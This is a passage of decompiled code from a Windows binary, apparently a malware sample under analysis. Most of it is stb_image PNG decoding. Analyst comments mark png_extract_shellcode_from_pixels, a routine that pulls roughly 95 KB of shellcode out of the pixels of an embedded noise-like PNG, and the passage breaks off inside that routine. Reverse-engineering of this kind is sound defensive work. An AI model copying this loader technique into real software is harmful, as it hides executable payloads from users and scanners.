            uVar14 = 0;
            puVar16 = _Memory;
            puVar12 = puVar11;
            while( true ) {
              iVar22 = uVar4 - 1;
              if (-1 < (int)(uVar4 - 1)) {
                do {
                  iVar22 = iVar22 + -1;
                  *puVar12 = *puVar16;
                  *(ushort *)(puVar12 + 1) = (ushort)puVar16[1];
                  puVar16 = puVar16 + 2;
                  puVar12 = (uint *)((longlong)puVar12 + 6);
                } while (iVar22 != -1);
              }
              uVar14 = uVar14 + 1;
              uVar20 = uVar20 + iVar9;
              uVar19 = uVar19 + iVar8;
              if (uVar3 == uVar14) break;
              puVar16 = (uint *)((longlong)_Memory + (ulonglong)uVar19 * 2);
              puVar12 = (uint *)((longlong)puVar11 + (ulonglong)uVar20 * 2);
            }
          }
        }
        free(_Memory);
        puVar13[3] = param_5;
      }
    }
    *param_2 = *puVar13;
    *param_3 = puVar13[1];
    if (param_4 != (uint *)0x0) {
      *param_4 = puVar13[2];
    }
    puVar13 = (uint *)0x0;
  }
  free(puVar13);
  free(local_68);
  free(local_70);
  return puVar11;
}



/*
 * stbi_decode_png_rgba @ 140006090
 *
 * Wrapper around statically-linked stb_image library. Decodes a PNG
 * from an in-memory buffer into raw RGBA pixel data. Returns width,
 * height, and channel count. The decoded pixels are then passed to
 * png_extract_shellcode_from_pixels for steganographic extraction.
 */

uint * stbi_decode_png_rgba(uint *param_1,uint *param_2,uint *param_3,uint *param_4,uint param_5)

{
  uint uVar1;
  uint *_Memory;
  uint *puVar2;
  int *piVar3;
  undefined8 *puVar4;
  size_t sVar5;
  int iVar6;
  int local_54 [5];
  
  _Memory = FUN_140004ef0(param_1,param_2,param_3,param_4,param_5,local_54);
  if (_Memory == (uint *)0x0) {
    return (uint *)0x0;
  }
  if ((local_54[0] - 8U & 0xfffffff7) == 0) {
    puVar2 = _Memory;
    if (local_54[0] == 8) goto LAB_14000613c;
    uVar1 = param_5;
    if (param_5 == 0) {
      uVar1 = *param_4;
    }
    iVar6 = *param_3 * *param_2 * uVar1;
    puVar2 = (uint *)malloc((longlong)iVar6);
    if (puVar2 != (uint *)0x0) {
      sVar5 = 0;
      if (0 < iVar6) {
        do {
          *(undefined1 *)((longlong)puVar2 + sVar5) =
               *(undefined1 *)((longlong)_Memory + sVar5 * 2 + 1);
          sVar5 = sVar5 + 1;
        } while ((longlong)iVar6 != sVar5);
      }
      free(_Memory);
      goto LAB_14000613c;
    }
  }
  else {
    _assert("ri.bits_per_channel == 8 || ri.bits_per_channel == 16","stb_image.h",0x4f5);
  }
  puVar2 = (uint *)0x0;
  puVar4 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
  *puVar4 = "outofmem";
LAB_14000613c:
  piVar3 = (int *)FUN_1400092f0((size_t *)&DAT_14000b040);
  iVar6 = DAT_14002f038;
  if (*piVar3 != 0) {
    piVar3 = (int *)FUN_1400092f0((size_t *)&DAT_14000b020);
    iVar6 = *piVar3;
  }
  if (iVar6 != 0) {
    if (param_5 == 0) {
      param_5 = *param_4;
    }
    stbi_inflate_huffman((undefined8 *)puVar2,*param_2,*param_3,param_5);
  }
  return puVar2;
}



/* FUN_1400061f0 @ 1400061f0 */

void FUN_1400061f0(longlong param_1,int param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  uint local_e8 [4];
  undefined8 local_d8;
  undefined4 local_b8;
  undefined4 local_30;
  longlong local_28;
  longlong lStack_20;
  longlong local_18;
  longlong lStack_10;
  
  lStack_20 = param_2 + param_1;
  local_d8 = 0;
  local_b8 = 0;
  local_30 = 0;
  local_28 = param_1;
  local_18 = param_1;
  lStack_10 = lStack_20;
  stbi_decode_png_rgba(local_e8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_140006270 @ 140006270 */

void FUN_140006270(undefined8 *param_1,undefined8 param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  int iVar1;
  uint local_f8 [4];
  code *local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  ulonglong local_c8;
  undefined1 local_c0 [128];
  int local_40;
  undefined1 *local_38;
  undefined1 *local_30;
  undefined1 *local_28;
  undefined1 *local_20;
  
  local_e8 = (code *)*param_1;
  local_e0 = param_1[1];
  local_d8 = param_1[2];
  local_c8 = 0x8000000001;
  local_40 = 0;
  local_d0 = param_2;
  local_38 = local_c0;
  local_28 = local_c0;
  iVar1 = (*local_e8)(param_2,local_c0,0x80);
  local_40 = local_40 + ((int)local_38 - (int)local_28);
  if (iVar1 == 0) {
    local_c8 = local_c8 & 0xffffffff00000000;
    local_30 = local_c0 + 1;
    local_c0[0] = 0;
  }
  else {
    local_30 = local_c0 + iVar1;
  }
  local_38 = local_c0;
  local_20 = local_30;
  stbi_decode_png_rgba(local_f8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_140006360 @ 140006360 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void * FUN_140006360(uint *param_1,uint *param_2,uint *param_3,uint *param_4,uint param_5)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint *_Memory;
  undefined8 *puVar5;
  byte *pbVar6;
  float *pfVar7;
  int iVar8;
  int iVar9;
  ulonglong uVar10;
  longlong lVar11;
  int iVar12;
  double dVar13;
  double dVar14;
  void *local_78;
  
  _Memory = stbi_decode_png_rgba(param_1,param_2,param_3,param_4,param_5);
  if (_Memory == (uint *)0x0) {
    puVar5 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar5 = "unknown image type";
    return (void *)0x0;
  }
  if (param_5 == 0) {
    param_5 = *param_4;
  }
  uVar10 = (ulonglong)(int)param_5;
  uVar2 = *param_3;
  uVar3 = *param_2;
  if ((int)(uVar2 | uVar3) < 0) goto LAB_140006400;
  if (uVar2 == 0) {
    if ((int)param_5 < 0) goto LAB_140006400;
LAB_140006466:
    local_78 = malloc((longlong)(int)(param_5 * uVar2 * uVar3 * 4));
    if (local_78 == (void *)0x0) {
LAB_140006400:
      free(_Memory);
      puVar5 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
      *puVar5 = "outofmem";
      return (void *)0x0;
    }
    uVar4 = param_5;
    if ((uVar10 & 1) != 0) goto joined_r0x0001400065d5;
  }
  else {
    if (((int)(0x7fffffff / (longlong)(int)uVar2) < (int)uVar3) || ((int)param_5 < 0))
    goto LAB_140006400;
    if (param_5 != 0) {
      if (((int)(0x7fffffff / (longlong)(int)param_5) < (int)(uVar2 * uVar3)) ||
         (0x1fffffff < (int)(uVar2 * uVar3 * param_5))) goto LAB_140006400;
      goto LAB_140006466;
    }
    local_78 = malloc(0);
    if (local_78 == (void *)0x0) goto LAB_140006400;
  }
  uVar4 = param_5 - 1;
joined_r0x0001400065d5:
  if (uVar2 * uVar3 == 0) {
LAB_140006523:
    free(_Memory);
    return local_78;
  }
  iVar12 = uVar2 * uVar3;
  iVar9 = 0;
  iVar8 = 0;
  while ((int)uVar4 < 1) {
    iVar8 = iVar8 + 1;
    iVar9 = iVar9 + param_5;
    if (iVar12 <= iVar8) goto LAB_1400064c0;
  }
  do {
    lVar11 = 0;
    dVar14 = (double)_DAT_14000b0fc;
    do {
      dVar13 = (double)FUN_140009650((double)((float)*(byte *)((longlong)_Memory + lVar11 + iVar9) /
                                             255.0));
      *(float *)((longlong)local_78 + lVar11 * 4 + (longlong)iVar9 * 4) = (float)(dVar13 * dVar14);
      lVar11 = lVar11 + 1;
    } while ((int)uVar4 != lVar11);
    iVar8 = iVar8 + 1;
    iVar9 = iVar9 + param_5;
  } while (iVar8 < iVar12);
LAB_1400064c0:
  if ((int)uVar4 < (int)param_5) {
    pbVar6 = (byte *)((longlong)_Memory + (longlong)(int)uVar4);
    pfVar7 = (float *)((longlong)local_78 + (longlong)(int)uVar4 * 4);
    iVar8 = 0;
    do {
      bVar1 = *pbVar6;
      iVar8 = iVar8 + 1;
      pbVar6 = pbVar6 + uVar10;
      *pfVar7 = (float)bVar1 / 255.0;
      pfVar7 = pfVar7 + uVar10;
    } while (iVar8 < iVar12);
  }
  goto LAB_140006523;
}



/* FUN_140006620 @ 140006620 */

void FUN_140006620(longlong param_1,int param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  uint local_e8 [4];
  undefined8 local_d8;
  undefined4 local_b8;
  undefined4 local_30;
  longlong local_28;
  longlong lStack_20;
  longlong local_18;
  longlong lStack_10;
  
  lStack_20 = param_2 + param_1;
  local_d8 = 0;
  local_b8 = 0;
  local_30 = 0;
  local_28 = param_1;
  local_18 = param_1;
  lStack_10 = lStack_20;
  FUN_140006360(local_e8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_1400066a0 @ 1400066a0 */

void FUN_1400066a0(undefined8 *param_1,undefined8 param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  int iVar1;
  uint local_f8 [4];
  code *local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  ulonglong local_c8;
  undefined1 local_c0 [128];
  int local_40;
  undefined1 *local_38;
  undefined1 *local_30;
  undefined1 *local_28;
  undefined1 *local_20;
  
  local_e8 = (code *)*param_1;
  local_e0 = param_1[1];
  local_d8 = param_1[2];
  local_c8 = 0x8000000001;
  local_40 = 0;
  local_d0 = param_2;
  local_38 = local_c0;
  local_28 = local_c0;
  iVar1 = (*local_e8)(param_2,local_c0,0x80);
  local_40 = local_40 + ((int)local_38 - (int)local_28);
  if (iVar1 == 0) {
    local_c8 = local_c8 & 0xffffffff00000000;
    local_30 = local_c0 + 1;
    local_c0[0] = 0;
  }
  else {
    local_30 = local_c0 + iVar1;
  }
  local_38 = local_c0;
  local_20 = local_30;
  FUN_140006360(local_f8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_140006790 @ 140006790 */

uint * FUN_140006790(uint *param_1,uint *param_2,uint *param_3,uint *param_4,uint param_5)

{
  uint uVar1;
  uint *_Memory;
  uint *puVar2;
  int *piVar3;
  undefined8 *puVar4;
  longlong lVar5;
  int iVar6;
  int local_44 [3];
  
  _Memory = FUN_140004ef0(param_1,param_2,param_3,param_4,param_5,local_44);
  if (_Memory == (uint *)0x0) {
    return (uint *)0x0;
  }
  if ((local_44[0] - 8U & 0xfffffff7) == 0) {
    puVar2 = _Memory;
    if (local_44[0] == 0x10) goto LAB_140006848;
    uVar1 = param_5;
    if (param_5 == 0) {
      uVar1 = *param_4;
    }
    iVar6 = *param_3 * *param_2 * uVar1;
    puVar2 = (uint *)malloc((longlong)(iVar6 * 2));
    if (puVar2 != (uint *)0x0) {
      lVar5 = 0;
      if (0 < iVar6) {
        do {
          *(ushort *)((longlong)puVar2 + lVar5 * 2) =
               (ushort)*(byte *)((longlong)_Memory + lVar5) * 0x100 +
               (ushort)*(byte *)((longlong)_Memory + lVar5);
          lVar5 = lVar5 + 1;
        } while (iVar6 != lVar5);
      }
      free(_Memory);
      goto LAB_140006848;
    }
  }
  else {
    _assert("ri.bits_per_channel == 8 || ri.bits_per_channel == 16","stb_image.h",0x50f);
  }
  puVar2 = (uint *)0x0;
  puVar4 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
  *puVar4 = "outofmem";
LAB_140006848:
  piVar3 = (int *)FUN_1400092f0((size_t *)&DAT_14000b040);
  iVar6 = DAT_14002f038;
  if (*piVar3 != 0) {
    piVar3 = (int *)FUN_1400092f0((size_t *)&DAT_14000b020);
    iVar6 = *piVar3;
  }
  if (iVar6 != 0) {
    if (param_5 == 0) {
      param_5 = *param_4;
    }
    stbi_inflate_huffman((undefined8 *)puVar2,*param_2,*param_3,param_5 * 2);
  }
  return puVar2;
}



/* FUN_1400068f0 @ 1400068f0 */

void FUN_1400068f0(longlong param_1,int param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  uint local_e8 [4];
  undefined8 local_d8;
  undefined4 local_b8;
  undefined4 local_30;
  longlong local_28;
  longlong lStack_20;
  longlong local_18;
  longlong lStack_10;
  
  lStack_20 = param_2 + param_1;
  local_d8 = 0;
  local_b8 = 0;
  local_30 = 0;
  local_28 = param_1;
  local_18 = param_1;
  lStack_10 = lStack_20;
  FUN_140006790(local_e8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_140006970 @ 140006970 */

void FUN_140006970(undefined8 *param_1,undefined8 param_2,uint *param_3,uint *param_4,uint *param_5,
                  uint param_6)

{
  int iVar1;
  uint local_f8 [4];
  code *local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  ulonglong local_c8;
  undefined1 local_c0 [128];
  int local_40;
  undefined1 *local_38;
  undefined1 *local_30;
  undefined1 *local_28;
  undefined1 *local_20;
  
  local_e8 = (code *)*param_1;
  local_e0 = param_1[1];
  local_d8 = param_1[2];
  local_c8 = 0x8000000001;
  local_40 = 0;
  local_d0 = param_2;
  local_38 = local_c0;
  local_28 = local_c0;
  iVar1 = (*local_e8)(param_2,local_c0,0x80);
  local_40 = local_40 + ((int)local_38 - (int)local_28);
  if (iVar1 == 0) {
    local_c8 = local_c8 & 0xffffffff00000000;
    local_30 = local_c0 + 1;
    local_c0[0] = 0;
  }
  else {
    local_30 = local_c0 + iVar1;
  }
  local_38 = local_c0;
  local_20 = local_30;
  FUN_140006790(local_f8,param_3,param_4,param_5,param_6);
  return;
}



/* FUN_140006a60 @ 140006a60 */

void FUN_140006a60(longlong *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)

{
  longlong lVar1;
  uint *puVar2;
  
  puVar2 = FUN_140003920(param_1,2,0);
  if ((int)puVar2 != 0) {
    if (param_2 != (undefined4 *)0x0) {
      *param_2 = *(undefined4 *)*param_1;
    }
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = *(undefined4 *)(*param_1 + 4);
    }
    if (param_4 != (undefined4 *)0x0) {
      *param_4 = *(undefined4 *)(*param_1 + 8);
    }
    return;
  }
  lVar1 = *param_1;
  *(undefined8 *)(lVar1 + 0xc0) = *(undefined8 *)(lVar1 + 0xd0);
  *(undefined8 *)(lVar1 + 200) = *(undefined8 *)(lVar1 + 0xd8);
  return;
}



/* FUN_140006ae0 @ 140006ae0 */

uint * FUN_140006ae0(longlong param_1)

{
  uint *puVar1;
  longlong local_38 [4];
  int local_18;
  
  local_38[0] = param_1;
  puVar1 = FUN_140003920(local_38,2,0);
  if (((int)puVar1 == 0) || (local_18 != 0x10)) {
    puVar1 = (uint *)0x0;
    *(undefined8 *)(local_38[0] + 0xc0) = *(undefined8 *)(local_38[0] + 0xd0);
    *(undefined8 *)(local_38[0] + 200) = *(undefined8 *)(local_38[0] + 0xd8);
  }
  return puVar1;
}



/* FUN_140006b30 @ 140006b30 */

int FUN_140006b30(longlong param_1,int param_2,longlong param_3,int param_4)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  undefined8 uVar4;
  ulonglong uStackX_20;
  undefined8 uStack_8;
  
  uStack_8 = 0x140006b3a;
  uVar3 = FUN_1400091c0();
  lVar1 = -uVar3;
  *(longlong *)((longlong)&uStackX_20 + lVar1) = param_3;
  *(undefined4 *)(&stack0x00000058 + lVar1) = 0;
  *(longlong *)(&stack0x00000050 + lVar1) = param_2 + param_1;
  *(longlong *)(&stack0x00000028 + lVar1) = param_3 + param_4;
  *(longlong *)(&stack0x00000040 + lVar1) = param_1;
  *(longlong *)(&stack0x00000048 + lVar1) = param_1;
  *(undefined8 *)((longlong)&uStack_8 + lVar1) = 0x140006b7d;
  uVar4 = stbi_parse_png_file((ulonglong *)((longlong)&uStackX_20 + lVar1),1);
  if ((int)uVar4 == 0) {
    iVar2 = -1;
  }
  else {
    iVar2 = (int)*(undefined8 *)(&stack0x00000040 + lVar1) -
            (int)*(undefined8 *)(&stack0x00000048 + lVar1);
  }
  return iVar2;
}



/* FUN_140006bb0 @ 140006bb0 */

void * FUN_140006bb0(longlong param_1,int param_2,int *param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  void *pvVar3;
  undefined8 uVar4;
  ulonglong auStackX_8 [4];
  undefined8 uStack_20;
  
  uStack_20 = 0x140006bbd;
  uVar2 = FUN_1400091c0();
  lVar1 = -uVar2;
  *(undefined8 *)((longlong)&uStack_20 + lVar1) = 0x140006bd2;
  pvVar3 = malloc(0x4000);
  if (pvVar3 != (void *)0x0) {
    *(longlong *)((longlong)auStackX_8 + lVar1) = param_1;
    *(longlong *)(&stack0x00000038 + lVar1) = (longlong)pvVar3 + 0x4000;
    *(longlong *)((longlong)auStackX_8 + lVar1 + 8) = param_1 + param_2;
    *(undefined4 *)(&stack0x00000040 + lVar1) = 1;
    *(void **)(&stack0x00000028 + lVar1) = pvVar3;
    *(void **)(&stack0x00000030 + lVar1) = pvVar3;
    *(undefined8 *)((longlong)&uStack_20 + lVar1) = 0x140006c14;
    uVar4 = stbi_parse_png_file((ulonglong *)((longlong)auStackX_8 + lVar1),0);
    pvVar3 = *(void **)(&stack0x00000030 + lVar1);
    if ((int)uVar4 != 0) {
      if (param_3 == (int *)0x0) {
        return pvVar3;
      }
      *param_3 = (int)*(undefined8 *)(&stack0x00000028 + lVar1) - (int)pvVar3;
      return pvVar3;
    }
    *(undefined8 *)((longlong)&uStack_20 + lVar1) = 0x140006c48;
    free(pvVar3);
  }
  return (void *)0x0;
}



/* FUN_140006c50 @ 140006c50 */

int FUN_140006c50(longlong param_1,int param_2,longlong param_3,int param_4)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  undefined8 uVar4;
  ulonglong uStackX_20;
  undefined8 uStack_8;
  
  uStack_8 = 0x140006c5a;
  uVar3 = FUN_1400091c0();
  lVar1 = -uVar3;
  *(longlong *)((longlong)&uStackX_20 + lVar1) = param_3;
  *(undefined4 *)(&stack0x00000058 + lVar1) = 0;
  *(longlong *)(&stack0x00000050 + lVar1) = param_2 + param_1;
  *(longlong *)(&stack0x00000028 + lVar1) = param_3 + param_4;
  *(longlong *)(&stack0x00000040 + lVar1) = param_1;
  *(longlong *)(&stack0x00000048 + lVar1) = param_1;
  *(undefined8 *)((longlong)&uStack_8 + lVar1) = 0x140006c9a;
  uVar4 = stbi_parse_png_file((ulonglong *)((longlong)&uStackX_20 + lVar1),0);
  if ((int)uVar4 == 0) {
    iVar2 = -1;
  }
  else {
    iVar2 = (int)*(undefined8 *)(&stack0x00000040 + lVar1) -
            (int)*(undefined8 *)(&stack0x00000048 + lVar1);
  }
  return iVar2;
}



/* FUN_140006cc0 @ 140006cc0 */

void FUN_140006cc0(undefined4 param_1)

{
  DAT_14002f034 = param_1;
  return;
}



/* FUN_140006cd0 @ 140006cd0 */

void FUN_140006cd0(undefined4 param_1)

{
  DAT_14002f030 = param_1;
  return;
}



/* FUN_140006ce0 @ 140006ce0 */

void FUN_140006ce0(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b060);
  *puVar1 = param_1;
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b080);
  *puVar1 = 1;
  return;
}



/* FUN_140006d10 @ 140006d10 */

void FUN_140006d10(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b0a0);
  *puVar1 = param_1;
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b0c0);
  *puVar1 = 1;
  return;
}



/* FUN_140006d40 @ 140006d40 */

int FUN_140006d40(longlong param_1,int param_2,undefined4 *param_3,undefined4 *param_4,
                 undefined4 *param_5)

{
  int iVar1;
  undefined8 *puVar2;
  undefined1 *local_118 [6];
  undefined1 local_e8 [16];
  undefined8 local_d8;
  undefined4 local_b8;
  undefined4 local_30;
  longlong local_28;
  longlong lStack_20;
  longlong local_18;
  longlong lStack_10;
  
  lStack_20 = param_2 + param_1;
  local_d8 = 0;
  local_b8 = 0;
  local_118[0] = local_e8;
  local_30 = 0;
  local_28 = param_1;
  local_18 = param_1;
  lStack_10 = lStack_20;
  iVar1 = FUN_140006a60((longlong *)local_118,param_3,param_4,param_5);
  if (iVar1 == 0) {
    puVar2 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar2 = "unknown image type";
  }
  return iVar1;
}



/* FUN_140006de0 @ 140006de0 */

int FUN_140006de0(undefined8 *param_1,undefined8 param_2,undefined4 *param_3,undefined4 *param_4,
                 undefined4 *param_5)

{
  int iVar1;
  undefined8 *puVar2;
  undefined1 *local_128 [6];
  undefined1 local_f8 [16];
  code *local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  ulonglong local_c8;
  undefined1 local_c0 [128];
  int local_40;
  undefined1 *local_38;
  undefined1 *local_30;
  undefined1 *local_28;
  undefined1 *local_20;
  
  local_40 = 0;
  local_e8 = (code *)*param_1;
  local_e0 = param_1[1];
  local_d8 = param_1[2];
  local_c8 = 0x8000000001;
  local_d0 = param_2;
  local_38 = local_c0;
  local_28 = local_c0;
  iVar1 = (*local_e8)(param_2,local_c0,0x80);
  local_40 = local_40 + ((int)local_38 - (int)local_28);
  if (iVar1 == 0) {
    local_c0[0] = 0;
    local_30 = local_c0 + 1;
    local_c8 = local_c8 & 0xffffffff00000000;
  }
  else {
    local_30 = local_c0 + iVar1;
  }
  local_128[0] = local_f8;
  local_38 = local_c0;
  local_20 = local_30;
  iVar1 = FUN_140006a60((longlong *)local_128,param_3,param_4,param_5);
  if (iVar1 == 0) {
    puVar2 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar2 = "unknown image type";
  }
  return iVar1;
}



/* FUN_140006f00 @ 140006f00 */

void FUN_140006f00(longlong param_1,int param_2)

{
  undefined1 local_e8 [16];
  undefined8 local_d8;
  undefined4 local_b8;
  undefined4 local_30;
  longlong local_28;
  longlong lStack_20;
  longlong local_18;
  longlong lStack_10;
  
  local_d8 = 0;
  lStack_20 = param_1 + param_2;
  local_b8 = 0;
  local_30 = 0;
  local_28 = param_1;
  local_18 = param_1;
  lStack_10 = lStack_20;
  FUN_140006ae0((longlong)local_e8);
  return;
}



/* FUN_140006f60 @ 140006f60 */

void FUN_140006f60(undefined8 *param_1,undefined8 param_2)

{
  int iVar1;
  undefined1 local_e8 [16];
  code *local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  ulonglong local_b8;
  undefined1 local_b0 [128];
  int local_30;
  undefined1 *local_28;
  undefined1 *local_20;
  undefined1 *local_18;
  undefined1 *local_10;
  
  local_30 = 0;
  local_d8 = (code *)*param_1;
  local_d0 = param_1[1];
  local_c8 = param_1[2];
  local_b8 = 0x8000000001;
  local_c0 = param_2;
  local_28 = local_b0;
  local_18 = local_b0;
  iVar1 = (*local_d8)(param_2,local_b0,0x80);
  local_30 = local_30 + ((int)local_28 - (int)local_18);
  if (iVar1 == 0) {
    local_b8 = local_b8 & 0xffffffff00000000;
    local_20 = local_b0 + 1;
    local_b0[0] = 0;
  }
  else {
    local_20 = local_b0 + iVar1;
  }
  local_28 = local_b0;
  local_10 = local_20;
  FUN_140006ae0((longlong)local_e8);
  return;
}



/* FUN_140007030 @ 140007030 */

undefined8 FUN_140007030(undefined8 *param_1,undefined4 *param_2)

{
  *param_1 = &EMBEDDED_PNG_DATA;
  *param_2 = 0x1f5a5;
  return 1;
}



/*
 * png_extract_shellcode_from_pixels @ 140007070
 *
 * PNG steganography extraction. Reads shellcode from RGBA pixel data:
 *   - Pixel 0: RGBA bytes interpreted as big-endian uint32 = shellcode size (95,743)
 *   - Pixel 1: G, B channels = first 2 shellcode bytes (R and A skipped)
 *   - Pixels 2+: R, G, B channels = remaining shellcode bytes (alpha always skipped)
 * The embedded PNG is a 179x179 RGBA image that looks like random noise.
 */

bool png_extract_shellcode_from_pixels(longlong param_1,int param_2)

{
  longlong lVar1;
  int iVar2;
  int iVar3;
  ulonglong uVar4;
  uint *puVar5;
  uint uVar6;
  int iVar7;
  undefined1 *puVar8;
  undefined1 *puVar9;
  int iVar10;
  longlong lVar11;
  longlong lVar12;
  undefined1 *puVar13;
  uint uVar14;
  uint *puVar15;
  uint uVar16;
  bool bVar17;
  int aiStackX_8 [4];
  undefined1 auStackX_19 [3];
  uint auStackX_1c [3];
  undefined8 uStack_48;
  
  uStack_48 = 0x140007086;
  uVar4 = FUN_1400091c0();
  lVar1 = -uVar4;
  puVar15 = (uint *)(&stack0x00000030 + lVar1);
  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar1) = 4;
  *(undefined8 *)(&stack0x00000040 + lVar1) = 0;
  *(undefined4 *)(&stack0x00000060 + lVar1) = 0;
  *(undefined4 *)(&stack0x000000e8 + lVar1) = 0;
  *(longlong *)(&stack0x000000f0 + lVar1) = param_1;
  *(longlong *)(&stack0x000000f8 + lVar1) = param_1 + param_2;
  *(longlong *)(&stack0x00000100 + lVar1) = param_1;
  *(longlong *)(&stack0x00000108 + lVar1) = param_1 + param_2;
  *(undefined8 *)((longlong)&uStack_48 + lVar1) = 0x1400070fa;
  puVar5 = stbi_decode_png_rgba(puVar15,(uint *)(auStackX_19 + lVar1 + 3),
                         (uint *)((longlong)auStackX_1c + lVar1 + 4),
                         (uint *)((longlong)auStackX_1c + lVar1 + 8),
                         *(uint *)(&stack0xffffffffffffffe0 + lVar1));
  if (puVar5 != (uint *)0x0) {
    iVar3 = *(int *)(auStackX_19 + lVar1 + 3);
    iVar7 = *(int *)((longlong)auStackX_1c + lVar1 + 4);
    if (1 < iVar3 * iVar7) {
      uVar14 = *puVar5;
      uVar6 = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;
      if (uVar6 - 1 < 0x3200000) {
        (&stack0x00000030)[lVar1] = *(undefined1 *)((longlong)puVar5 + 5);
        if (uVar14 == 0x1000000) {
          uVar4 = 1;
        }
        else {
          (&stack0x00000031)[lVar1] = *(undefined1 *)((longlong)puVar5 + 6);
          if ((iVar7 < 1) || (uVar6 < 3)) {
            uVar4 = 2;
          }
          else {
            iVar7 = 0;
            uVar14 = 2;
            *(undefined1 **)(&stack0xfffffffffffffff0 + lVar1) = &stack0x00000028 + lVar1;
            uVar4 = 2;
            do {
              bVar17 = uVar14 < uVar6;
              if ((0 < iVar3) && (iVar2 = 0, bVar17)) {
                do {
                  iVar10 = iVar3 * iVar7 + iVar2;
                  if (1 < iVar10) {
                    lVar11 = (longlong)(iVar10 * 4);
                    auStackX_19[lVar1] = *(undefined1 *)((longlong)puVar5 + lVar11);
                    uVar16 = uVar14 + 1;
                    if (uVar16 < uVar6) {
                      auStackX_19[lVar1 + 1] = *(undefined1 *)((longlong)puVar5 + lVar11 + 1);
                      uVar16 = uVar14 + 2;
                      if (uVar16 < uVar6) {
                        uVar16 = uVar14 + 3;
                        lVar12 = 3;
                        auStackX_19[lVar1 + 2] = *(undefined1 *)((longlong)puVar5 + lVar11 + 2);
                      }
                      else {
                        lVar12 = 2;
                      }
                    }
                    else {
                      lVar12 = 1;
                    }
                    puVar9 = auStackX_19 + lVar1;
                    *(uint *)((longlong)auStackX_1c + lVar1 + -0x1c) = uVar6;
                    puVar13 = puVar9 + lVar12;
                    *(uint *)((longlong)auStackX_1c + lVar1 + -0x18) = uVar16;
                    *(int *)((longlong)aiStackX_8 + lVar1) = iVar2;
                    *(int *)((longlong)aiStackX_8 + lVar1 + 4) = iVar7;
                    *(uint **)(&stack0xfffffffffffffff8 + lVar1) = puVar5;
                    do {
                      while( true ) {
                        uVar14 = (int)uVar4 + 1;
                        (&stack0x00000030)[uVar4 + lVar1] = *puVar9;
                        if (0xfff < uVar14) break;
                        puVar9 = puVar9 + 1;
                        uVar4 = (ulonglong)uVar14;
                        if (puVar9 == puVar13) goto LAB_1400072c5;
                      }
                      *(undefined8 *)(&stack0x00000028 + lVar1) = 0;
                      *(undefined8 *)(&stack0xffffffffffffffe0 + lVar1) =
                           *(undefined8 *)(&stack0xfffffffffffffff0 + lVar1);
                      *(undefined8 *)((longlong)&uStack_48 + lVar1) = 0x140007248;
                      iVar3 = stbi_mad3sizes_valid();
                      if ((iVar3 < 0) ||
                         ((ulonglong)uVar14 != *(ulonglong *)(&stack0x00000028 + lVar1))) {
                        puVar5 = *(uint **)(&stack0xfffffffffffffff8 + lVar1);
                        bVar17 = false;
                        goto LAB_140007352;
                      }
                      puVar5 = puVar15;
                      for (lVar11 = 0x1000; lVar11 != 0; lVar11 = lVar11 + -1) {
                        *(undefined1 *)puVar5 = 0;
                        puVar5 = (uint *)((longlong)puVar5 + 1);
                      }
                      if (puVar13 == puVar9 + 1) {
                        uVar6 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x1c);
                        uVar14 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x18);
                        iVar2 = *(int *)((longlong)aiStackX_8 + lVar1);
                        iVar7 = *(int *)((longlong)aiStackX_8 + lVar1 + 4);
                        uVar4 = 0;
                        puVar5 = *(uint **)(&stack0xfffffffffffffff8 + lVar1);
                        iVar3 = *(int *)(auStackX_19 + lVar1 + 3);
                        goto LAB_1400072f0;
                      }
                      puVar8 = puVar9 + 2;
                      (&stack0x00000030)[lVar1] = puVar9[1];
                      if (puVar8 == puVar13) {
                        uVar6 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x1c);
                        uVar14 = *(uint *)((longlong)auStackX_1c + lVar1 + -0x18);
                        iVar2 = *(int *)((longlong)aiStackX_8 + lVar1);
                        iVar7 = *(int *)((longlong)aiStackX_8 + lVar1 + 4);
                        uVar4 = 1;
                        puVar5 = *(uint **)(&stack0xfffffffffffffff8 + lVar1);
                        iVar3 = *(int *)(auStackX_19 + lVar1 + 3);
                        goto LAB_1400072f0;
                      }
                      puVar9 = puVar9 + 3;
